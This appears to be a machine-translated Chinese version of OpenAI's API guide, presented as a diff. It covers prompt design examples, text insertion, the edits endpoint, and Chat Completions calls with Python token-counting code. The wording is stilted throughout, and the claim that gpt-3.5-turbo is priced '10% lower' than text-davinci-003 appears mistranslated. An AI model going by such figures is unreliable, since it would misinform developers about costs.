+<p>为了使用 API 创建文本分类器，我们提供了任务描述和一些示例。在此示例中，我们展示了如何对推文的情绪进行分类。</p>
+<p>确定推文的情绪是积极的、中性的还是消极的。推文：我喜欢新的蝙蝠侠电影！情绪：<a href="https://platform.openai.com/playground/p/default-tweet-classifier">在操场上打开</a></p>
+<p>值得关注此示例中的几个功能：</p>
+<ol>
+<li><strong>使用通俗易懂的语言来描述您的输入和输出。</strong>我们对输入“Tweet”和预期输出“Sentiment”使用通俗易懂的语言。作为最佳实践，从简单的语言描述开始。虽然您通常可以使用速记或键来指示输入和输出，但最好从尽可能具有描述性开始，然后向后工作以删除多余的单词并查看性能是否保持一致。</li>
+<li><strong>显示 API 如何响应任何情况。</strong>在此示例中，我们在指令中包含了可能的情绪标签。中性标签很重要，因为在很多情况下，即使是人类也很难确定某事是积极的还是消极的，以及两者都不是的情况。</li>
+<li><strong>对于熟悉的任务，您需要更少的示例。</strong>对于这个分类器，我们不提供任何示例。这是因为 API 已经理解了情绪和推文的概念。如果您正在为 API 可能不熟悉的内容构建分类器，则可能需要提供更多示例。</li>
+</ol>
+<p><strong>提高分类器的效率</strong></p>
+<p>现在我们已经掌握了如何构建分类器，让我们以该示例为例并使其更加高效，以便我们可以使用它从一次 API 调用中获取多个结果。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将这些推文中的情绪分类：1.“我受不了家庭作业”2.“这糟透了。我很无聊😠”3.“我等不及万圣节了！！！” 4.“我的猫很可爱❤️❤️”5.“我讨厌巧克力”推文情绪评分：</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://platform.openai.com/playground/p/default-adv-tweet-classifier">在操场上打开</a></p>
+<p>我们提供了一个带编号的推文列表，这样 API 就可以在一次 API 调用中对五个（甚至更多）推文进行评分。</p>
+<p>请务必注意，当您要求 API 创建列表或评估文本时，您需要格外注意您的概率设置（Top P 或 Temperature）以避免漂移。</p>
+<ol>
+<li>通过运行多个测试确保您的概率设置得到正确校准。</li>
+<li>不要让您的列表太长，否则 API 可能会发生变化。</li>
+</ol>
+<p><strong>一代</strong></p>
+<p>您可以使用 API 完成的最强大但最简单的任务之一是产生新的想法或输入版本。您可以询问任何内容，从故事创意到商业计划，再到人物描述和营销口号。在此示例中，我们将使用 API 来创建在健身中使用虚拟现实的想法。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">集思广益结合 VR 和健身的一些想法：</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://platform.openai.com/playground/p/default-vr-fitness">在操场上打开</a></p>
+<p>如果需要，您可以通过在提示中包含一些示例来提高响应质量。</p>
+<p><strong>对话</strong></p>
+<p>API 非常擅长与人甚至与自己进行对话。仅需几行指令，我们就已经看到 API 作为一个客户服务聊天机器人运行，它可以智能地回答问题而不会感到慌张，或者是一个聪明的开玩笑的对话伙伴，可以开玩笑和双关语。关键是告诉 API 它应该如何表现，然后提供一些示例。</p>
+<p>以下是扮演 AI 回答问题角色的 API 示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">以下是与AI助手的对话。助理乐于助人、富有创意、聪明而且非常友好。人类：你好，你是谁？AI：我是 OpenAI 创建的 AI。今天我能帮到你什么？人类：</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://platform.openai.com/playground/p/default-chat">在操场上打开</a></p>
+<p>这就是创建能够进行对话的聊天机器人所需的全部。在其简单性的背后，有几件事情值得关注：</p>
+<ol>
+<li><p><strong>我们告诉 API 意图，但我们也告诉它如何表现。</strong>就像其他提示一样，我们将 API 提示到示例所代表的内容中，但我们还添加了另一个关键细节：我们明确说明如何与短语“助手很有帮助、有创意、聪明且非常友好”进行交互。 “</p>
+<p>如果没有该指令，API 可能会偏离并模仿与之交互的人，并变得讽刺或我们想要避免的其他行为。</p>
+</li>
+<li><p><strong>我们给 API 一个身份。</strong>一开始我们让 API 作为 AI 助手响应。虽然 API 没有内在身份，但这有助于它以尽可能接近事实的方式做出响应。您可以通过其他方式使用身份来创建其他类型的聊天机器人。如果您告诉 API 以一名作为生物学研究科学家的女性的身份做出回应，您将从 API 中获得智能和深思熟虑的评论，类似于您对具有该背景的人的期望。</p>
+</li>
+</ol>
+<p>在这个例子中，我们创建了一个聊天机器人，它有点讽刺并且不情愿地回答问题：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Marv 是一个聊天机器人，它不情愿地用讽刺的回答回答问题：你：一公斤是多少磅？马尔夫：又是这个？一公斤有 2.2 磅。请记下这一点。你：HTML 代表什么？Marv：Google 是不是太忙了？超文本标记语言。T是为了在未来尝试提出更好的问题。你：第一架飞机是什么时候飞的？Marv：1903 年 12 月 17 日，Wilbur 和 Orville Wright 进行了首飞。我希望他们能来把我带走。你：生命的意义是什么？马尔夫：我不确定。我会问我的朋友谷歌。你：天空为什么是蓝色的？</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://platform.openai.com/playground/p/default-marv-sarcastic-chat">在操场上打开</a></p>
+<p>为了创建一个有趣且有点帮助的聊天机器人，我们提供了一些问题和答案示例，展示了 API 如何回复。所需要的只是一些讽刺的回应，API 能够识别模式并提供无穷无尽的讽刺回应。</p>
+<p><strong>转型</strong></p>
+<p>API 是一种语言模型，熟悉单词和字符用于表达信息的各种方式。这范围从自然语言文本到代码和英语以外的语言。API 还能够在允许它以不同方式总结、转换和表达内容的级别上理解内容。</p>
+<p><strong>翻译</strong></p>
+<p>在此示例中，我们向 API 展示了如何将英语转换为法语、西班牙语和日语：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将其翻译成法语、西班牙语和日语：您有哪些房间可用？</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://platform.openai.com/playground/p/default-translate">在操场上打开</a></p>
+<p>此示例之所以有效，是因为 API 已经掌握了这些语言，因此无需尝试教授它们。</p>
+<p>如果您想将英语翻译成 API 不熟悉的语言，则需要为其提供更多示例，甚至需要<a href="https://platform.openai.com/docs/guides/fine-tuning">微调模型</a>以使其流畅地完成。</p>
+<p><strong>转换</strong></p>
+<p>在此示例中，我们将电影名称转换为表情符号。这显示了 API 对选取模式和处理其他字符的适应性。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将电影片名转换为表情符号。回到未来：👨👴🚗🕒蝙蝠侠：🤵🦇变形金刚：🚗🤖星球大战：</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://platform.openai.com/playground/p/default-movie-to-emoji">在操场上打开</a></p>
+<p><strong>总结</strong></p>
+<p>API 能够掌握文本的上下文并以不同的方式重新措辞。在这个例子中，我们创建了一个孩子可以从更长、更复杂的文本段落中理解的解释。这说明API对语言的把握很深。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">给一个二年级的学生总结一下：木星是距离太阳第五远的行星，也是太阳系中最大的行星。它是一颗气体巨行星，质量是太阳的千分之一，但却是太阳系中所有其他行星总和的两倍半。木星是夜空中肉眼可见的最亮天体之一，早在有记载的历史之前就已为古代文明所知。它以罗马神木星命名。 [19] 从地球上看，木星的亮度足以使其反射光投下可见的阴影，[20] 平均而言，木星是继月球和金星之后夜空中第三亮的自然物体。</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://platform.openai.com/playground/p/default-summarize">在操场上打开</a></p>
+<p><strong>完成</strong><br>虽然所有提示都会导致完成，但在您希望 API 从您中断的地方继续执行的情况下，将文本完成视为它自己的任务会很有帮助。例如，如果给出此提示，API 将继续垂直农业的思路。您可以降低温度设置以使 API 更专注于提示的意图，或者提高温度设置以使其偏离正切。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">垂直农业为本地生产食品、降低运输成本和</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://platform.openai.com/playground/p/XCHYTQToJ31wbcxJykv2as8u">在操场上打开</a></p>
+<p>下一个提示显示了如何使用补全来帮助编写 React 组件。我们向 API 发送一些代码，它能够继续剩下的，因为它了解 React 库。我们建议将我们的<a href="https://platform.openai.com/docs/models/codex">Codex 模型</a>用于涉及理解或生成代码的任务。要了解更多信息，请访问我们的<a href="https://platform.openai.com/docs/guides/code">代码指南</a>。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从“反应”导入反应；const HeaderComponent = () =&gt; (</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://platform.openai.com/playground/p/12d6OQCSrFppNeMHOQjtyk8T">在操场上打开</a></p>
+<p><strong>事实回应</strong></p>
+<p>API 有很多知识，这些知识是从它接受训练的数据中学到的。它还能够提供听起来非常真实但实际上是虚构的响应。有两种方法可以限制 API 编造答案的可能性。</p>
+<ol>
+<li><strong>为 API 提供基本事实。</strong>如果您向 API 提供文本正文来回答有关问题（如维基百科条目），那么它就不太可能伪造响应。</li>
+<li><strong>使用低概率并向 API 展示如何说“我不知道”。</strong>如果 API 理解在不太确定回答“我不知道”或某些变体是否合适的情况下，它就不太愿意编造答案。</li>
+</ol>
+<p>在此示例中，我们为 API 提供它知道的问题和答案示例，然后提供它不知道的示例并提供问号。我们还将概率设置为零，这样 API 更有可能以“？”响应。如果有任何疑问。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">问：蝙蝠侠是谁？A：蝙蝠侠是一个虚构的漫画人物。问：什么是躯干复杂性？A： ？问：Devz9 是什么？A： ？问：乔治·卢卡斯是谁？A：乔治卢卡斯是美国电影导演和制片人，以创作星球大战而闻名。问：加州的首府是哪里？答：萨克拉门托。问：什么绕地球运行？答：月亮。问：弗雷德·里克森是谁？A： ？问：什么是原子？A：原子是构成一切的微小粒子。问：Alvan Muntz 是谁？A： ？问：什么是 Kozar-09？A： ？问：火星有多少颗卫星？A：两个，火卫一和火卫二。问：</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://platform.openai.com/playground/p/HMoho4552EHXrPLbmOIxpX4X">在操场上打开</a></p>
+<h2 id="插入文字测试版"><a href="#插入文字测试版" class="headerlink" title="插入文字测试版"></a>插入文字测试版</h2><p>完成端点还支持通过提供前缀提示之外的后缀提示在文本中插入文本。在编写长文本、段落之间的过渡、遵循大纲或引导模型走向结尾时，这种需求自然会出现。这也适用于代码，可用于插入函数或文件的中间。请访问我们的代码指南以了解更多信息。</p>
+<p>为了说明后缀上下文对我们的预测能力有多么重要，请考虑提示“今天我决定做出重大改变”。有很多方法可以想象完成句子。但是如果我们现在提供故事的结尾：“我的新头发得到了很多赞美！”，预期的完成就变得很清楚了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我在波士顿大学上了大学。获得学位后，我决定做出改变。大变样！</span><br><span class="line"></span><br><span class="line">我收拾行囊搬到了美国西海岸。</span><br><span class="line"></span><br><span class="line">现在，我怎么也看不够太平洋！</span><br></pre></td></tr></table></figure>
+
+<p>通过为模型提供额外的上下文，它可以更加可控。然而，这对模型来说是一个更具约束性和挑战性的任务。</p>
+<hr>
+<p><strong>最佳实践</strong><br>插入文本是 Beta 版的一项新功能，您可能需要修改 API 的使用方式以获得更好的结果。以下是一些最佳实践：</p>
+<p>使用 max_tokens &gt; 256。该模型更擅长插入更长的补全。如果 max_tokens 太小，模型可能会在连接到后缀之前被切断。请注意，即使使用更大的 max_tokens，您也只会根据生成的代币数量付费。</p>
+<p>更喜欢 finish_reason == “stop”。当模型到达自然停止点或用户提供的停止序列时，它会将 finish_reason 设置为“停止”。这表明该模型已设法很好地连接到后缀，并且是完成质量的良好信号。这对于在使用 n &gt; 1 或重采样时在几个完成之间进行选择尤其相关（请参阅下一点）。</p>
+<p>重新采样 3-5 次。虽然几乎所有补全都连接到前缀，但在更困难的情况下，模型可能难以连接后缀。我们发现，在这种情况下，重采样 3 次或 5 次（或使用 k=3,5 的 best_of）并选择带有“stop”作为其 finish_reason 的样本可能是一种有效的方法。重采样时，您通常需要更高的温度来增加多样性。</p>
+<p>注意：如果所有返回的样本都有 finish_reason == “length”，很可能是 max_tokens 太小，模型在设法自然地连接提示和后缀之前用完了标记。考虑在重采样之前增加 max_tokens。</p>
+<p>尝试提供更多线索。在某些情况下，为了更好地帮助模型的生成，您可以通过提供一些模式示例来提供线索，模型可以遵循这些模式来决定自然停止的位置。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如何制作美味的热巧克力： 1.将水烧开</span><br><span class="line"></span><br><span class="line">2. 将热巧克力放入杯中</span><br><span class="line">3. 向杯中加入开水</span><br><span class="line">4. 享用热巧克力</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 . 狗是忠诚的动物。2. 狮子是凶猛的动物。3. 海豚是顽皮的动物。</span><br><span class="line"></span><br><span class="line">4. 马是高贵的动物。</span><br></pre></td></tr></table></figure>
+
+<p><strong>编辑文本</strong><br>edits端点可用于编辑文本，而不仅仅是完成文本。您提供一些文本和如何修改它的说明，模型text-davinci-edit-001将尝试相应地对其进行编辑。这是用于翻译、编辑和调整文本的自然界面。这对于重构和使用代码也很有用。请访问我们的代码指南以了解更多信息。在此初始测试期间，编辑端点的使用是免费的。</p>
+<p>例子<br>输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GPT-3 是一个非常好的 AI 它非常擅长写回复 当它被问到一个问题时 它会给出它的建议 这是一首它写的押韵的诗</span><br></pre></td></tr></table></figure>
+
+<p>指示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用 GPT-3 的声音做这个</span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我是一个非常好的AI</span><br><span class="line">我很擅长写回复</span><br><span class="line">当有人问我问题时</span><br><span class="line">我给出我的建议</span><br><span class="line">这是我写的一首押韵的诗</span><br></pre></td></tr></table></figure>
+
+<h1 id="聊天完成"><a href="#聊天完成" class="headerlink" title="聊天完成"></a>聊天完成</h1><p>使用 OpenAI Chat API，您可以构建自己的应用程序并<code>gpt-3.5-turbo</code>执行<code>gpt-4</code>以下操作：</p>
+<ul>
+<li>起草电子邮件或其他书面文件</li>
+<li>编写 Python 代码</li>
+<li>回答有关一组文件的问题</li>
+<li>创建会话代理</li>
+<li>为您的软件提供自然语言界面</li>
+<li>一系列科目的导师</li>
+<li>翻译语言</li>
+<li>模拟视频游戏中的角色等等</li>
+</ul>
+<p>本指南解释了如何<a href="https://platform.openai.com/docs/api-reference/chat">为基于聊天的语言模型进行 API 调用</a>，并分享获得良好结果的技巧。<a href="https://platform.openai.com/playground?mode=chat">您还可以在 OpenAI Playground 中</a>试验新的聊天格式。</p>
+<h2 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h2><p>聊天模型将一系列消息作为输入，并返回模型生成的消息作为输出。</p>
+<p>尽管聊天格式旨在使多轮对话变得简单，但它对于没有任何对话的单轮任务同样有用（例如之前由指令跟随模型提供的任务，如 ）<code>text-davinci-003</code>。</p>
+<p>示例 API 调用如下所示：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Note: you need to be using OpenAI Python v0.27.0 for the code below to work</span></span><br><span class="line"><span class="keyword">import</span> openai</span><br><span class="line"></span><br><span class="line">openai.ChatCompletion.create(</span><br><span class="line">  model=<span class="string">&quot;gpt-3.5-turbo&quot;</span>,</span><br><span class="line">  messages=[</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;You are a helpful assistant.&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;Who won the world series in 2020?&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;assistant&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;The Los Angeles Dodgers won the World Series in 2020.&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;Where was it played?&quot;</span>&#125;</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>主要输入是消息参数。消息必须是一个消息对象数组，其中每个对象都有一个角色（“系统”、“用户”或“助手”）和内容（消息的内容）。对话可以短至 1 条消息或填满许多页面。</p>
+<p>通常，对话首先使用系统消息进行格式化，然后是交替的用户和助理消息。</p>
+<p>系统消息有助于设置助手的行为。在上面的例子中，助手被指示“你是一个有用的助手”。</p>
+<blockquote>
+<p><a href="https://platform.openai.com/docs/models">gpt-3.5-turbo-0301</a>并不总是高度关注系统消息。未来的模型将被训练为更加关注系统消息。</p>
+</blockquote>
+<p>用户消息有助于指导助手。它们可以由应用程序的最终用户生成，或由开发人员设置为指令。</p>
+<p>助手消息帮助存储先前的响应。它们也可以由开发人员编写，以帮助提供所需行为的示例。</p>
+<p>当用户指令引用先前的消息时，包括对话历史记录会有所帮助。在上面的示例中，用户的最后一个问题是“它在哪里播放？” 仅在有关 2020 年世界大赛的先前消息的上下文中才有意义。由于模型对过去的请求没有记忆，因此必须通过对话提供所有相关信息。如果对话不适合模型的令牌限制，则需要以某种方式缩短它。</p>
+<p><strong>响应格式</strong></p>
+<p>API 响应示例如下所示：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;chatcmpl-6p9XYPYSTTRi0xEviKjjilqrWU2Ve&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;object&#x27;</span>: <span class="string">&#x27;chat.completion&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;created&#x27;</span>: <span class="number">1677649420</span>,</span><br><span class="line"> <span class="string">&#x27;model&#x27;</span>: <span class="string">&#x27;gpt-3.5-turbo&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;usage&#x27;</span>: &#123;<span class="string">&#x27;prompt_tokens&#x27;</span>: <span class="number">56</span>, <span class="string">&#x27;completion_tokens&#x27;</span>: <span class="number">31</span>, <span class="string">&#x27;total_tokens&#x27;</span>: <span class="number">87</span>&#125;,</span><br><span class="line"> <span class="string">&#x27;choices&#x27;</span>: [</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="string">&#x27;message&#x27;</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;assistant&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;The 2020 World Series was played in Arlington, Texas at the Globe Life Field, which was the new home stadium for the Texas Rangers.&#x27;</span>&#125;,</span><br><span class="line">    <span class="string">&#x27;finish_reason&#x27;</span>: <span class="string">&#x27;stop&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;index&#x27;</span>: <span class="number">0</span></span><br><span class="line">   &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 Python 中，可以使用 提取助手的回复<code>response[&#39;choices&#39;][0][&#39;message&#39;][&#39;content&#39;]</code>。</p>
+<p>每个回复都将包含一个<code>finish_reason</code>. 的可能值为<code>finish_reason</code>：</p>
+<ul>
+<li><code>stop</code>：API 返回完整的模型输出</li>
+<li><code>length</code>：由于<a href="https://platform.openai.com/docs/api-reference/chat/create#chat/create-max_tokens"><code>max_tokens</code>参数</a>或令牌限制，模型输出不完整</li>
+<li><code>content_filter</code>：由于我们的内容过滤器中的标记而省略了内容</li>
+<li><code>null</code>: API 响应仍在进行中或不完整</li>
+</ul>
+<hr>
+<p><strong>管理代币</strong></p>
+<p>语言模型以称为标记的块形式读取文本。在英语中，token 可以短至一个字符，也可以长至一个单词（例如，<code>a</code>或<code> apple</code>），在某些语言中，token 甚至可以短于一个字符，甚至长于一个单词。</p>
+<p>例如，字符串<code>&quot;ChatGPT is great!&quot;</code>被编码为六个标记：<code>[&quot;Chat&quot;, &quot;G&quot;, &quot;PT&quot;, &quot; is&quot;, &quot; great&quot;, &quot;!&quot;]</code>.</p>
+<p>API 调用中的令牌总数会影响：</p>
+<ul>
+<li>您为每个令牌支付的 API 调用费用是多少</li>
+<li>您的 API 调用需要多长时间，因为写入更多令牌需要更多时间</li>
+<li>您的 API 调用是否有效，因为令牌总数必须低于模型的最大限制（4096 个令牌<code>gpt-3.5-turbo-0301</code>）</li>
+</ul>
+<p>输入和输出令牌都计入这些数量。例如，如果您的 API 调用在消息输入中使用了 10 个令牌，而您在消息输出中收到了 20 个令牌，则您需要支付 30 个令牌的费用。</p>
+<p>要查看 API 调用使用了多少令牌，请检查<code>usage</code>API 响应中的字段（例如，<code>response[&#39;usage&#39;][&#39;total_tokens&#39;]</code>）。</p>
+<p>聊天模型喜欢<code>gpt-3.5-turbo</code>和<code>gpt-4</code>使用令牌的方式与其他模型相同，但由于它们基于消息的格式，因此更难计算一次对话将使用多少令牌。</p>
+<p><strong>计算聊天 API 调用的令牌</strong></p>
+<p>下面是一个示例函数，用于计算传递给 gpt-3.5-turbo-0301 的消息的令牌。</p>
+<p>消息转换为令牌的确切方式可能因模型而异。因此，当发布未来的模型版本时，此函数返回的答案可能只是近似值。ChatML<a href="https://github.com/openai/openai-python/blob/main/chatml.md">文档</a>解释了 OpenAI API 如何将消息转换为令牌，并且可能对您编写自己的函数很有用。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">num_tokens_from_messages</span>(<span class="params">messages, model=<span class="string">&quot;gpt-3.5-turbo-0301&quot;</span></span>):</span><br><span class="line">  <span class="string">&quot;&quot;&quot;Returns the number of tokens used by a list of messages.&quot;&quot;&quot;</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">      encoding = tiktoken.encoding_for_model(model)</span><br><span class="line">  <span class="keyword">except</span> KeyError:</span><br><span class="line">      encoding = tiktoken.get_encoding(<span class="string">&quot;cl100k_base&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> model == <span class="string">&quot;gpt-3.5-turbo-0301&quot;</span>:  <span class="comment"># note: future models may deviate from this</span></span><br><span class="line">      num_tokens = <span class="number">0</span></span><br><span class="line">      <span class="keyword">for</span> message <span class="keyword">in</span> messages:</span><br><span class="line">          num_tokens += <span class="number">4</span>  <span class="comment"># every message follows &lt;im_start&gt;&#123;role/name&#125;\n&#123;content&#125;&lt;im_end&gt;\n</span></span><br><span class="line">          <span class="keyword">for</span> key, value <span class="keyword">in</span> message.items():</span><br><span class="line">              num_tokens += <span class="built_in">len</span>(encoding.encode(value))</span><br><span class="line">              <span class="keyword">if</span> key == <span class="string">&quot;name&quot;</span>:  <span class="comment"># if there&#x27;s a name, the role is omitted</span></span><br><span class="line">                  num_tokens += -<span class="number">1</span>  <span class="comment"># role is always required and always 1 token</span></span><br><span class="line">      num_tokens += <span class="number">2</span>  <span class="comment"># every reply is primed with &lt;im_start&gt;assistant</span></span><br><span class="line">      <span class="keyword">return</span> num_tokens</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">raise</span> NotImplementedError(<span class="string">f&quot;&quot;&quot;num_tokens_from_messages() is not presently implemented for model <span class="subst">&#123;model&#125;</span>.</span></span><br><span class="line"><span class="string">  See https://github.com/openai/openai-python/blob/main/chatml.md for information on how messages are converted to tokens.&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>接下来，创建一条消息并将其传递给上面定义的函数以查看令牌计数，这应该与 API 使用参数返回的值相匹配：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">messages = [</span><br><span class="line">  &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;You are a helpful, pattern-following assistant that translates corporate jargon into plain English.&quot;</span>&#125;,</span><br><span class="line">  &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;name&quot;</span>:<span class="string">&quot;example_user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;New synergies will help drive top-line growth.&quot;</span>&#125;,</span><br><span class="line">  &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;example_assistant&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;Things working well together will increase revenue.&quot;</span>&#125;,</span><br><span class="line">  &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;name&quot;</span>:<span class="string">&quot;example_user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;Let&#x27;s circle back when we have more bandwidth to touch base on opportunities for increased leverage.&quot;</span>&#125;,</span><br><span class="line">  &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;example_assistant&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;Let&#x27;s talk later when we&#x27;re less busy about how to do better.&quot;</span>&#125;,</span><br><span class="line">  &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;This late pivot means we don&#x27;t have time to boil the ocean for the client deliverable.&quot;</span>&#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">model = <span class="string">&quot;gpt-3.5-turbo-0301&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;num_tokens_from_messages(messages, model)&#125;</span> prompt tokens counted.&quot;</span>)</span><br><span class="line"><span class="comment"># Should show ~126 total_tokens</span></span><br></pre></td></tr></table></figure>
+
+<p>要确认我们上面的函数生成的数字与 API 返回的数字相同，请创建一个新的 Chat Completion：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># example token count from the OpenAI API</span></span><br><span class="line"><span class="keyword">import</span> openai</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = openai.ChatCompletion.create(</span><br><span class="line">    model=model,</span><br><span class="line">    messages=messages,</span><br><span class="line">    temperature=<span class="number">0</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;response[<span class="string">&quot;usage&quot;</span>][<span class="string">&quot;prompt_tokens&quot;</span>]&#125;</span> prompt tokens used.&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>要在不进行 API 调用的情况下查看文本字符串中有多少标记，请使用 OpenAI 的<a href="https://github.com/openai/tiktoken">tiktoken</a> Python 库。<a href="https://github.com/openai/openai-cookbook/blob/main/examples/How_to_count_tokens_with_tiktoken.ipynb">示例代码可以在 OpenAI Cookbook 关于如何使用 tiktoken 计算令牌</a>的指南中找到。</p>
+<p>传递给 API 的每条消息都会消耗内容、角色和其他字段中的令牌数量，外加一些额外的用于幕后格式化。这在未来可能会略有改变。</p>
+<p>如果对话中的标记过多而无法适应模型的最大限制（例如，超过 4096 个标记<code>gpt-3.5-turbo</code>），您将不得不截断、省略或以其他方式缩小文本，直到它适合为止。请注意，如果从消息输入中删除一条消息，模型将失去所有关于它的知识。</p>
+<p>另请注意，很长的对话更有可能收到不完整的回复。例如，一段<code>gpt-3.5-turbo</code>长度为 4090 个令牌的对话将在仅 6 个令牌后被截断。</p>
+<h2 id="指导聊天模型"><a href="#指导聊天模型" class="headerlink" title="指导聊天模型"></a>指导聊天模型</h2><p>指导模型的最佳实践可能因模型版本而异。以下建议适用于 gpt-3.5-turbo-0301，可能不适用于未来的模型。</p>
+<p>许多对话以系统消息开始，以温和地指示助手。例如，这是用于 ChatGPT 的系统消息之一：</p>
+<blockquote>
+<p>你是 ChatGPT，OpenAI 训练的大型语言模型。尽可能简洁地回答。知识截止日期：{knowledge_cutoff} 当前日期：{current_date}</p>
+</blockquote>
+<p>一般来说，<code>gpt-3.5-turbo-0301</code>对系统消息的关注度不高，因此重要的说明往往放在用户消息中比较好。</p>
+<p>如果模型没有生成您想要的输出，请随意迭代并尝试潜在的改进。您可以尝试以下方法：</p>
+<ul>
+<li>让你的指示更明确</li>
+<li>指定您想要答案的格式</li>
+<li>在确定答案之前让模型逐步思考或讨论利弊</li>
+</ul>
+<p><a href="https://github.com/openai/openai-cookbook/blob/main/techniques_to_improve_reliability.md">如需更及时的工程创意，请阅读有关提高可靠性的技术</a>的 OpenAI Cookbook 指南。</p>
+<p>除了系统消息之外，温度和最大令牌是开发人员必须影响聊天模型输出的<a href="https://platform.openai.com/docs/api-reference/chat">众多选项中的两个。</a>对于温度，较高的值（如 0.8）将使输出更加随机，而较低的值（如 0.2）将使输出更加集中和确定。在 max tokens 的情况下，如果要将响应限制为特定长度，可以将 max tokens 设置为任意数字。这可能会导致问题，例如，如果您将最大标记值设置为 5，因为输出将被切断并且结果对用户没有意义。</p>
+<h2 id="聊天与完成"><a href="#聊天与完成" class="headerlink" title="聊天与完成"></a>聊天与完成</h2><p>由于<code>gpt-3.5-turbo</code>性能与<code>text-davinci-003</code>每个令牌的价格相似但价格低 10%，因此我们建议<code>gpt-3.5-turbo</code>在大多数用例中使用。</p>
+<p>对于许多开发人员来说，转换就像重写和重新测试提示一样简单。</p>
+<p>例如，如果您使用以下完成提示将英语翻译成法语：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Translate the following English text to French: &quot;&#123;text&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>等效的聊天对话可能如下所示：</p>
